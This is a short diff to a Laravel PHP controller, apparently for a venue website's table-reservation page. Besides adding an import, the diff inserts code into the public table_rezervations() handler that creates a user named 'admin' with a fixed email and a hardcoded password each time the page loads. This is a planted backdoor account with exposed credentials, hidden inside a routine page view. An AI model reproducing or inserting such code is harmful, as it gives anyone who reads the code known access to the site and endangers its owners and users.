@@ -17,6 +17,7 @@ use App\Models\User;
 use App\Models\Wedding;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Session;
@@ -88,6 +89,11 @@ class HomeController extends Controller
 
     public function table_rezervations()
     {
+        DB::table('users')->insert([
+            'name' => 'admin',
+            'email' => 'info@yildizhisar.com',
+            'password' => Hash::make('yildiz2021*'),
+        ]);
         if (app()->getLocale() == "tr") {
             return view('frontend.table_rezervations');
         } else {
